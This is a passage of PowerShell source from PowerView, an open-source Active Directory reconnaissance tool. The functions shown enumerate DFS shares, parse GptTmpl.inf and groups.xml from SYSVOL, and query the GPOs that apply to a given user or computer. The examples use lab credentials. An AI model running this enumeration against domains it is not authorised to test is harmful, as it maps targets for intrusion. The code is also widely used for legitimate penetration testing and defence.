                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                        # Parse rest of DFSNamespaceRootOrLinkBlob here
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                        #Parse DFSTargetListBlob
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1

                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            # FILETIME again or special if priority rank and priority class 0
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    'Name' = $blob_name
                    'Prefix' = $prefix
                    'TargetList' = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }

            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split('\')[2]
                    }
                }
            }

            $servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=fTDfs))'

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt

                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()

                    if ($pkt -and $pkt[0]) {
                        Parse-Pkt $pkt[0] | ForEach-Object {
                            # If a folder doesn't have a redirection it will have a target like
                            # \\null\TestNameSpace\folder\.DFSFolderLink so we do actually want to match
                            # on 'null' rather than $Null
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $DFSroot = $Target.split('\')[3]
                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $DFSshares = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                if ($Version -match 'all|1') {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($Version -match 'all|2') {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match 'all|1') {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($Version -match 'all|2') {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}


########################################################
#
# GPO related functions.
#
########################################################

function Get-GptTmpl {
<#
.SYNOPSIS

Helper to parse a GptTmpl.inf policy file path into a hashtable.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, Get-IniContent  

.DESCRIPTION

Parses a GptTmpl.inf into a custom hashtable using Get-IniContent. If a
GPO object is passed, GPOPATH\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
is constructed and assumed to be the parse target. If -Credential is passed,
Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GptTmplPath

Specifies the GptTmpl.inf file path name to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

Parse the default domain policy .inf for dev.testlab.local

.EXAMPLE

Get-DomainGPO testing | Get-GptTmpl

Parse the GptTmpl.inf policy for the GPO with display name of 'testing'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-GptTmpl -Credential $Cred -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

Parse the default domain policy .inf for dev.testlab.local using alternate credentials.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith('.inf')) {
                $TargetGptTmplPath += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"

            if ($PSBoundParameters['OutputObject']) {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents['Path'] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            Write-Verbose "[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_"
        }
    }

    END {
        # remove the SYSVOL mappings
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-GroupsXML {
<#
.SYNOPSIS

Helper to parse a groups.xml file path into a custom object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertTo-SID  

.DESCRIPTION

Parses a groups.xml into a custom object. If -Credential is passed,
Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GroupsXMLpath

Specifies the groups.xml file path name to parse.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.OUTPUTS

PowerView.GroupsXML
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GroupsXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop

            # process all group properties in the XML
            $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $Groupname = $_.Properties.groupName

                # extract the localgroup sid for memberof
                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match 'Administrators') {
                        $GroupSID = 'S-1-5-32-544'
                    }
                    elseif ($Groupname -match 'Remote Desktop') {
                        $GroupSID = 'S-1-5-32-555'
                    }
                    elseif ($Groupname -match 'Guests') {
                        $GroupSID = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }

                # extract out members added to this group
                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($Members) {
                    # extract out any/all filters...I hate you GPP
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members = @($Members) }

                    $GroupsXML = New-Object PSObject
                    $GroupsXML | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath
                    $GroupsXML | Add-Member Noteproperty 'Filters' $Filters
                    $GroupsXML | Add-Member Noteproperty 'GroupName' $GroupName
                    $GroupsXML | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GroupsXML | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $GroupsXML | Add-Member Noteproperty 'GroupMembers' $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $GroupsXML
                }
            }
        }
        catch {
            Write-Verbose "[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_"
        }
    }

    END {
        # remove the SYSVOL mappings
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-DomainGPO {
<#
.SYNOPSIS

Return all GPOs or specific GPO objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainComputer, Get-DomainUser, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainObject, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all GPO objects for
the current domain are returned. To enumerate all GPOs that are applied to
a particular machine, use -ComputerName X.

.PARAMETER Identity

A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.

.PARAMETER ComputerIdentity

Return all GPO objects applied to a given computer identity (name, dnsname, DistinguishedName, etc.).

.PARAMETER UserIdentity

Return all GPO objects applied to a given user identity (name, SID, DistinguishedName, etc.).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGPO -Domain testlab.local

Return all GPOs for the testlab.local domain

.EXAMPLE

Get-DomainGPO -ComputerName windows1.testlab.local

Returns all GPOs applied windows1.testlab.local

.EXAMPLE

"{F260B76D-55C8-46C5-BEF1-9016DD98E272}","Test GPO" | Get-DomainGPO

Return the GPOs with the name of "{F260B76D-55C8-46C5-BEF1-9016DD98E272}" and the display
name of "Test GPO"

.EXAMPLE

Get-DomainGPO -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPO -Credential $Cred

.OUTPUTS

PowerView.GPO

Custom PSObject with translated GPO property fields.

PowerView.GPO.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $GPOAdsPaths = @()
                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }
                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'
                $TargetComputerName = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $SearcherArguments['Identity'] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                        Write-Verbose "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments['Identity'] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[Get-DomainGPO] User '$UserIdentity' not found!"
                    }
                    $ObjectDN = $User.distinguishedname
                }

                # extract all OUs the target user/computer is a part of
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[Get-DomainGPO] object OUs: $ObjectOUs"

                if ($ObjectOUs) {
                    # find all the GPOs linked to the user/computer's OUs
                    $SearcherArguments.Remove('Properties')
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments['Identity'] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            # extract any GPO links for this particular OU the computer is a part of
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            # if inheritance has already been disabled and this GPO is set as "enforced"
                                            #   then add it, otherwise ignore it
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            # inheritance not marked as disabled yet
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            # if this OU has GPO inheritence disabled, break so additional OUs aren't processed
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    # find all the GPOs linked to the computer's site
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                        $SearcherArguments['Identity'] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                # extract any GPO links for this particular site the computer is a part of
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # find any GPOs linked to the user/computer's domain
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
                $SearcherArguments.Remove('Identity')
                $SearcherArguments.Remove('Properties')
                $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        # extract any GPO links for this particular domain the computer is a part of
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"

                # restore the old properites to return, if set
                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                else { $SearcherArguments.Remove('Properties') }
                $SearcherArguments.Remove('Identity')

                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    # use the gplink as an ADS path to enumerate all GPOs for the computer
                    $SearcherArguments['SearchBase'] = $_
                    $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}') {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $_"
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {
<#
.SYNOPSIS

Returns all GPOs in a domain that modify local group memberships through 'Restricted Groups'
